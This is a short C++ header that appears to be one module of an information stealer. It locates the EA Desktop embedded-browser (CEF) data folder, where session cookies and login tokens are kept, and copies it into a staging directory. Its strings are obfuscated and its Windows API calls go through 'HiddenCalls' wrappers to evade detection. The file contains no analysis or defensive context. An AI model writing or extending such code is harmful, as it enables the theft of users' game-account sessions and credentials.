#ifndef ELECTRONICARTS_HPP
#define ELECTRONICARTS_HPP

#include <string>
#include <filesystem>
#include "Winapi_structs.hpp"

namespace fs = std::filesystem;

namespace ElectronicArts {
    inline void Extract(const std::string& baseDir) {
        std::string eaFolder = std::string(getenv(OBF("LOCALAPPDATA"))) + "\\" + OBF("Electronic Arts\\EA Desktop\\CEF");
        if (!fs::exists(eaFolder)) return;

        std::string targetDir = baseDir + "\\" + OBF("ElectronicArts");
        HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);

        HiddenCalls::CopyDirectory(eaFolder.c_str(), targetDir.c_str());
    }
}

#endif
